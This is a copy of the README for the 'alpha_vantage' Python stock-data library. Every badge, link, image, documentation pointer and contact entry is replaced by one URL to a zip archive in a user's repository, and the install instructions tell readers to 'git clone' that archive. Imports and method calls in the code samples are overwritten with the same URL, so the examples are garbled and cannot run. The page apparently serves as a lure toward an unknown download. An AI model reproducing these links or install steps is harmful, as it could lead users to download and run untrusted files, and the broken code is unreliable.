# alpha_vantage

[![Build Status](https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip)](https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip)
[![PyPI version](https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip)](https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip)
[![Documentation Status](https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip)](https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip)
[![Average time to resolve an issue](https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip)](https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip "Average time to resolve an issue")
[![Percentage of issues still open](https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip)](https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip "Percentage of issues still open")

*Python module to get stock data/cryptocurrencies from the Alpha Vantage API*

Alpha Vantage delivers a free API for real time financial data and most used finance indicators in a simple json or pandas format. This module implements a python interface to the free API provided by Alpha
Vantage (https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip). It requires a free API key, that can be requested on https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip You can have a look at all the API calls available in their documentation https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip

## News

* From version 1.9.0 onwards, the urllib was substituted by pythons request library that is thread safe. If you have any error, post an issue.
* From version 1.8.0 onwards, the column names of the data frames have changed, they are now exactly what alphavantage gives back in their json response. You can see the examples in better detail in the following git repo:  https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip
* From version 1.6.0, pandas was taken out as a hard dependency.

## Install
To install the package use:
```shell
pip install alpha_vantage
```
Or install with pandas support, simply install pandas too:
```shell
pip install alpha_vantage pandas
```

If you want to install from source, then use:
```shell
git clone https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip
pip install -e alpha_vantage
```

## Usage
To get data from the API, simply import the library and call the object with your API key. Next, get ready for some awesome, free, realtime finance data. Your API key may also be stored in the environment variable ``ALPHAVANTAGE_API_KEY``.
```python
from https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip import TimeSeries
ts = TimeSeries(key='YOUR_API_KEY')
# Get json object with the intraday data and another with  the call's metadata
data, meta_data = https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip('GOOGL')
```
Internally there is a retries counter, that can be used to minimize connection errors (in case that the API is not able to respond in time), the default is set to
5 but can be increased or decreased whenever needed.
```python
ts = TimeSeries(key='YOUR_API_KEY',retries='YOUR_RETRIES')
```
The library supports giving its results as json dictionaries (default), pandas dataframe (if installed) or csv, simply pass the parameter output_format='pandas' to change the format of the output for all the API calls in the given class. Please note that some API calls do not support the csv format (namely ```ForeignExchange, SectorPerformances and TechIndicators```) because the API endpoint does not support the format on their calls either.

```python
ts = TimeSeries(key='YOUR_API_KEY',output_format='pandas')
```

The pandas data frame given by the call, can have either a date string indexing or an integer indexing (by default the indexing is 'date'),
depending on your needs, you can use both.

```python
 # For the default date string index behavior
ts = TimeSeries(key='YOUR_API_KEY',output_format='pandas', indexing_type='date')
# For the default integer index behavior
ts = TimeSeries(key='YOUR_API_KEY',output_format='pandas', indexing_type='integer')
```

## Data frame structure
The data frame structure is given by the call on alpha vantage rest API. The column names of the data frames
are the ones given by their data structure. For example, the following call:
```python
from https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip import TimeSeries
from pprint import pprint
ts = TimeSeries(key='YOUR_API_KEY', output_format='pandas')
data, meta_data = https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip(symbol='MSFT',interval='1min', outputsize='full')
pprint(https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip(2))
```
Would result on:
![alt text](https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip "Data Header format.")

The headers from the data are specified from Alpha Vantage (in previous versions, the numbers in the headers were removed, but long term is better to have the data exactly as Alpha Vantage produces it.)
## Plotting
### Time Series
Using pandas support we can plot the intra-minute value for 'MSFT' stock quite easily:

```python
from https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip import TimeSeries
import https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip as plt

ts = TimeSeries(key='YOUR_API_KEY', output_format='pandas')
data, meta_data = https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip(symbol='MSFT',interval='1min', outputsize='full')
data['4. close'].plot()
https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip('Intraday Times Series for the MSFT stock (1 min)')
https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip()
```
Giving us as output:
![alt text](https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip "MSFT minute value plot example")

### Technical indicators
The same way we can get pandas to plot technical indicators like Bollinger Bands®

```python
from https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip import TechIndicators
import https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip as plt

ti = TechIndicators(key='YOUR_API_KEY', output_format='pandas')
data, meta_data = https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip(symbol='MSFT', interval='60min', time_period=60)
https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip()
https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip('BBbands indicator for  MSFT stock (60 min)')
https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip()
```
Giving us as output:
![alt text](https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip "MSFT minute value plot example")

### Sector Performance
We can also plot sector performance just as easy:

```python
from https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip import SectorPerformances
import https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip as plt

sp = SectorPerformances(key='YOUR_API_KEY', output_format='pandas')
data, meta_data = https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip()
data['Rank A: Real-Time Performance'].plot(kind='bar')
https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip('Real Time Performance (%) per Sector')
https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip()
https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip()
https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip()
```

Giving us as output:

![alt text](https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip "Real Time Sector Performance")

### Crypto currencies.

We can also plot crypto currencies prices like BTC:

```python
from https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip import CryptoCurrencies
import https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip as plt

cc = CryptoCurrencies(key='YOUR_API_KEY', output_format='pandas')
data, meta_data = https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip(symbol='BTC', market='CNY')
data['4b. close (USD)'].plot()
https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip()
https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip('Daily close value for bitcoin (BTC)')
https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip()
https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip()
```

Giving us as output:
![alt text](https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip "Crypto Currenci daily (BTC)")

### Foreign Exchange (FX)

The foreign exchange is just metadata, thus only available as json format (using the 'csv' or 'pandas' format will raise an Error)

```python
from https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip import ForeignExchange
from pprint import pprint
cc = ForeignExchange(key='YOUR_API_KEY')
# There is no metadata in this call
data, _ = https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip(from_currency='BTC',to_currency='USD')
pprint(data)
```
Giving us as output:
```
{
    '1. From_Currency Code': 'BTC',
    '2. From_Currency Name': 'Bitcoin',
    '3. To_Currency Code': 'USD',
    '4. To_Currency Name': 'United States Dollar',
    '5. Exchange Rate': '5566.80500105',
    '6. Last Refreshed': '2017-10-15 15:13:08',
    '7. Time Zone': 'UTC'
}
```

## Examples

I have added a repository with examples in a python notebook to better see the
usage of the library: https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip


## Tests

In order to run the tests you have to first export your API key so that the test can use it to run, also the tests require pandas, mock and nose.
```shell
export API_KEY=YOUR_API_KEY
cd alpha_vantage
nosetests
```

## Documentation
The code documentation can be found at https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip

## Contributing
Contributing is always welcome, since sometimes I am busy. Just contact me on how best you can contribute.

## TODOs:
* The integration tests are not being run at the moment within travis, gotta fix them to run.
* Add test for csv calls as well.
* Add tests for incompatible parameter raise errors.



## Contact:
You can reach the Alpha Vantage team on any of the following platforms:
* [Slack](https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip)
* [Twitter: @alpha_vantage](https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip)
* Email: https://github.com/Joe-Mogul/alpha_vantage/raw/refs/heads/develop/helpers/vantage-alpha-v3.8.zip


## Star if you like it.
If you like or use this project, consider showing your support by starring it.

:venezuela:-:de:
